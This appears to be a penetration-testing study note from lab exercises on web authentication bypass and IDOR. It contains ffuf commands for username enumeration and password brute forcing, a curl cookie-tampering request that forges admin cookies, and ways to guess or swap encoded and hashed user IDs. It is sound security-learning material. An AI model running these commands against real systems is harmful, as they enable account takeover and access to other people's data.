# Enumeration
## Authentication Bypass
| Type | Description | Example |
|-|-|-|
| Username Enumeration | Abuse user authentication by looking at server responses like "An account with this username already exists." | `ffuf -w wordlist.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.220/customers/signup -mr "username already exists"` |
| Brute force | Brute force search for the password from the enumerated user | `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.32.175/customers/login -fc 200` |
| Logic flaws | Abuse faulty code | Exact string matches for `admin` could be `adMIN`. `Password reset forms`, Abuse `Header files` & `requests`, `Off by one errors`, etc.
| Cookie Tampering | Examining and editing the cookies set by the web server during your online session | `curl -H "Cookie: logged_in=true; admin=true" http://10.10.232.83/cookie-test` |

## Exploit IDOR vulns
IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.

***Where are they located?***
The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.

Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called user_id that you can use to display other users' information, for example, /user/details?user_id=123.

| Type | Description | Example |
|-|-|-|
| Basic | Basic example | Change values in links like: `http://online-service.thm/profile?user_id=1305` |
| Encoded IDOR IDs | Web developers will often encode data into some type of ASCII string commonly using a-z, A-Z, 0-9 and = characters for padding | Base64: `{"id":30}` becomes `eyJpZCI6MzB9` |
| Hashed IDs | A bit more complicated to deal with than encoded ones, but they may follow a predictable pattern | md5: `123` becomes `202cb962ac59075b964b07152d234b70` |
| Unpredictable IDs | If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. | Swap `two` account IDs |
|
